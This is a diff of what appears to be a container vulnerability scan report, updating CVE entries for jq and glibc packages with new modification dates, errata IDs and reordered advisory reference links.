@@ -126,7 +126,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ├ [2]  ╭ VulnerabilityID : CVE-2026-41256 
 │                       │      ├ PkgID           : jq@1.8.1-4ubuntu2 
 │                       │      ├ PkgName         : jq 
@@ -488,7 +488,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ├ [9]  ╭ VulnerabilityID : CVE-2026-4046 
 │                       │      ├ PkgID           : libc-bin@2.43-2ubuntu2 
 │                       │      ├ PkgName         : libc-bin 
@@ -531,35 +531,37 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20594 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4046 
-│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2453117 
-│                       │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [6] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4046 
+│                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [10]: https://errata.almalinux.org/10/ALSA-2026-20594.html 
-│                       │      │                  ├ [11]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [12]: https://inbox.sourceware.org/libc-announce/76814edf-c
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://inbox.sourceware.org/libc-announce/76814edf-c
 │                       │      │                  │       f7f-47ec-979d-2dce0a2c76bf@gotplt.org/T/#u 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4046.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-50291.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4046 
-│                       │      │                  ├ [16]: https://packages.fedoraproject.org/pkgs/glibc/glibc-g
+│                       │      │                  ├ [15]: https://linux.oracle.com/cve/CVE-2026-4046.html 
+│                       │      │                  ├ [16]: https://linux.oracle.com/errata/ELSA-2026-50291.html 
+│                       │      │                  ├ [17]: https://nvd.nist.gov/vuln/detail/CVE-2026-4046 
+│                       │      │                  ├ [18]: https://packages.fedoraproject.org/pkgs/glibc/glibc-g
 │                       │      │                  │       conv-extra/ 
-│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=33980 
-│                       │      │                  ├ [18]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
+│                       │      │                  ├ [19]: https://sourceware.org/bugzilla/show_bug.cgi?id=33980 
+│                       │      │                  ├ [20]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
 │                       │      │                  │       f=advisories/GLIBC-SA-2026-0007 
-│                       │      │                  ├ [19]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
+│                       │      │                  ├ [21]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
 │                       │      │                  │       f=advisories/GLIBC-SA-2026-0007;hb=HEAD 
-│                       │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-4046 
+│                       │      │                  ╰ [22]: https://www.cve.org/CVERecord?id=CVE-2026-4046 
 │                       │      ├ PublishedDate   : 2026-03-30T18:16:19.573Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:57.707Z 
 │                       ├ [10] ╭ VulnerabilityID : CVE-2026-4437 
@@ -602,29 +604,30 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 6.5 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19061 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4437 
 │                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [7] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
+│                       │      │                  │       26-4046 
 │                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [11]: https://errata.almalinux.org/10/ALSA-2026-19061.html 
-│                       │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4437.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4437 
-│                       │      │                  ├ [16]: https://sourceware.org/bugzilla/show_bug.cgi?id=34014 
-│                       │      │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-4437 
-│                       │      │                  ╰ [18]: https://www.openwall.com/lists/oss-security/2026/03/2
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-4437.html 
+│                       │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
+│                       │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-4437 
+│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=34014 
+│                       │      │                  ├ [18]: https://www.cve.org/CVERecord?id=CVE-2026-4437 
+│                       │      │                  ╰ [19]: https://www.openwall.com/lists/oss-security/2026/03/2
 │                       │      │                          3/2 
 │                       │      ├ PublishedDate   : 2026-03-20T20:16:49.477Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:57.923Z 
@@ -667,29 +670,30 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L
 │                       │      │                           │           /A:N 
 │                       │      │                           ╰ V3Score : 4 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19061 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4438 
 │                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [7] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
+│                       │      │                  │       26-4046 
 │                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [11]: https://errata.almalinux.org/10/ALSA-2026-19061.html 
-│                       │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4438.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4438 
-│                       │      │                  ├ [16]: https://sourceware.org/bugzilla/show_bug.cgi?id=34015 
-│                       │      │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-4438 
-│                       │      │                  ╰ [18]: https://www.openwall.com/lists/oss-security/2026/03/2
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-4438.html 
+│                       │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
+│                       │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-4438 
+│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=34015 
+│                       │      │                  ├ [18]: https://www.cve.org/CVERecord?id=CVE-2026-4438 
+│                       │      │                  ╰ [19]: https://www.openwall.com/lists/oss-security/2026/03/2
 │                       │      │                          3/2 
 │                       │      ├ PublishedDate   : 2026-03-20T20:16:49.623Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:58.247Z 
@@ -836,35 +840,37 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20594 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4046 
-│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2453117 
-│                       │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [6] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4046 
+│                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [10]: https://errata.almalinux.org/10/ALSA-2026-20594.html 
-│                       │      │                  ├ [11]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [12]: https://inbox.sourceware.org/libc-announce/76814edf-c
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://inbox.sourceware.org/libc-announce/76814edf-c
 │                       │      │                  │       f7f-47ec-979d-2dce0a2c76bf@gotplt.org/T/#u 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4046.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-50291.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4046 
-│                       │      │                  ├ [16]: https://packages.fedoraproject.org/pkgs/glibc/glibc-g
+│                       │      │                  ├ [15]: https://linux.oracle.com/cve/CVE-2026-4046.html 
+│                       │      │                  ├ [16]: https://linux.oracle.com/errata/ELSA-2026-50291.html 
+│                       │      │                  ├ [17]: https://nvd.nist.gov/vuln/detail/CVE-2026-4046 
+│                       │      │                  ├ [18]: https://packages.fedoraproject.org/pkgs/glibc/glibc-g
 │                       │      │                  │       conv-extra/ 
-│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=33980 
-│                       │      │                  ├ [18]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
+│                       │      │                  ├ [19]: https://sourceware.org/bugzilla/show_bug.cgi?id=33980 
+│                       │      │                  ├ [20]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
 │                       │      │                  │       f=advisories/GLIBC-SA-2026-0007 
-│                       │      │                  ├ [19]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
+│                       │      │                  ├ [21]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
 │                       │      │                  │       f=advisories/GLIBC-SA-2026-0007;hb=HEAD 
-│                       │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-4046 
+│                       │      │                  ╰ [22]: https://www.cve.org/CVERecord?id=CVE-2026-4046 
 │                       │      ├ PublishedDate   : 2026-03-30T18:16:19.573Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:57.707Z 
 │                       ├ [15] ╭ VulnerabilityID : CVE-2026-4437 
@@ -907,29 +913,30 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 6.5 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19061 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4437 
 │                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [7] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
+│                       │      │                  │       26-4046 
 │                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [11]: https://errata.almalinux.org/10/ALSA-2026-19061.html 
-│                       │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4437.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4437 
-│                       │      │                  ├ [16]: https://sourceware.org/bugzilla/show_bug.cgi?id=34014 
-│                       │      │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-4437 
-│                       │      │                  ╰ [18]: https://www.openwall.com/lists/oss-security/2026/03/2
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-4437.html 
+│                       │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
+│                       │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-4437 
+│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=34014 
+│                       │      │                  ├ [18]: https://www.cve.org/CVERecord?id=CVE-2026-4437 
+│                       │      │                  ╰ [19]: https://www.openwall.com/lists/oss-security/2026/03/2
 │                       │      │                          3/2 
 │                       │      ├ PublishedDate   : 2026-03-20T20:16:49.477Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:57.923Z 
@@ -972,29 +979,30 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L
 │                       │      │                           │           /A:N 
 │                       │      │                           ╰ V3Score : 4 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19061 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4438 
 │                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [7] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
+│                       │      │                  │       26-4046 
 │                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [11]: https://errata.almalinux.org/10/ALSA-2026-19061.html 
-│                       │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4438.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4438 
-│                       │      │                  ├ [16]: https://sourceware.org/bugzilla/show_bug.cgi?id=34015 
-│                       │      │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-4438 
-│                       │      │                  ╰ [18]: https://www.openwall.com/lists/oss-security/2026/03/2
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-4438.html 
+│                       │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
+│                       │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-4438 
+│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=34015 
+│                       │      │                  ├ [18]: https://www.cve.org/CVERecord?id=CVE-2026-4438 
+│                       │      │                  ╰ [19]: https://www.openwall.com/lists/oss-security/2026/03/2
 │                       │      │                          3/2 
 │                       │      ├ PublishedDate   : 2026-03-20T20:16:49.623Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:58.247Z 
@@ -1141,35 +1149,37 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20594 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4046 
-│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2453117 
-│                       │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [6] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4046 
+│                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [10]: https://errata.almalinux.org/10/ALSA-2026-20594.html 
-│                       │      │                  ├ [11]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [12]: https://inbox.sourceware.org/libc-announce/76814edf-c
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://inbox.sourceware.org/libc-announce/76814edf-c
 │                       │      │                  │       f7f-47ec-979d-2dce0a2c76bf@gotplt.org/T/#u 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4046.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-50291.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4046 
-│                       │      │                  ├ [16]: https://packages.fedoraproject.org/pkgs/glibc/glibc-g
+│                       │      │                  ├ [15]: https://linux.oracle.com/cve/CVE-2026-4046.html 
+│                       │      │                  ├ [16]: https://linux.oracle.com/errata/ELSA-2026-50291.html 
+│                       │      │                  ├ [17]: https://nvd.nist.gov/vuln/detail/CVE-2026-4046 
+│                       │      │                  ├ [18]: https://packages.fedoraproject.org/pkgs/glibc/glibc-g
 │                       │      │                  │       conv-extra/ 
-│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=33980 
-│                       │      │                  ├ [18]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
+│                       │      │                  ├ [19]: https://sourceware.org/bugzilla/show_bug.cgi?id=33980 
+│                       │      │                  ├ [20]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
 │                       │      │                  │       f=advisories/GLIBC-SA-2026-0007 
-│                       │      │                  ├ [19]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
+│                       │      │                  ├ [21]: https://sourceware.org/git/?p=glibc.git;a=blob_plain;
 │                       │      │                  │       f=advisories/GLIBC-SA-2026-0007;hb=HEAD 
-│                       │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-4046 
+│                       │      │                  ╰ [22]: https://www.cve.org/CVERecord?id=CVE-2026-4046 
 │                       │      ├ PublishedDate   : 2026-03-30T18:16:19.573Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:57.707Z 
 │                       ├ [20] ╭ VulnerabilityID : CVE-2026-4437 
@@ -1212,29 +1222,30 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 6.5 
